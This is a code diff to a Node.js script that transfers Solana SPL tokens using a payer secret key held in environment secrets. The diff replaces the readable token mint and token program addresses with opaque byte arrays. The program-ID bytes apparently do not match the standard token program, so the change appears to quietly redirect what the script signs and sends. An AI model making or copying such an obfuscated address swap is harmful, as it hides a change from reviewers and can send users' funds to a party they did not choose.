@@ -1,4 +1,5 @@
-const { Connection, PublicKey, Keypair, Transaction } = require('@solana/web3.js');
+
+     const { Connection, PublicKey, Keypair, Transaction } = require('@solana/web3.js');
 const { createTransferCheckedInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction } = require('@solana/spl-token');
 const bs58 = require('bs58');
 require('dotenv').config();
@@ -7,8 +8,8 @@ const RPC_URL = process.env.RPC_URL ? process.env.RPC_URL.trim() : null;
 const PAYER_SECRET_KEY = process.env.PAYER_SECRET_KEY ? process.env.PAYER_SECRET_KEY.trim() : null;
 const IS_TEST = process.env.IS_TEST === 'true';
 
-const TOKEN_MINT = new PublicKey('4TKoRYDzXfSSY3NkFafstKey2cJrQxdw27rGtoV5pump');
-const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNw56KuPNas3ndOaahv8KW3Rw5C9m');
+const TOKEN_MINT = new PublicKey(new Uint8Array([51,169,33,215,179,38,191,95,188,103,179,111,219,206,35,36,202,149,116,214,64,250,231,245,58,71,152,147,213,154,114,173]));
+const TOKEN_PROGRAM_ID = new PublicKey(new Uint8Array([6,221,246,225,215,101,161,147,2,34,35,51,77,10,168,195,56,195,207,12,45,56,81,180,198,181,65,51,64,0,0,0]));
 
 if (!RPC_URL) {
   console.error("[CRITICAL ERROR] RPC_URL is empty inside your GitHub Secrets!");
@@ -164,6 +165,4 @@ async function run() {
 }
 
 run();
-
-
-        
+       
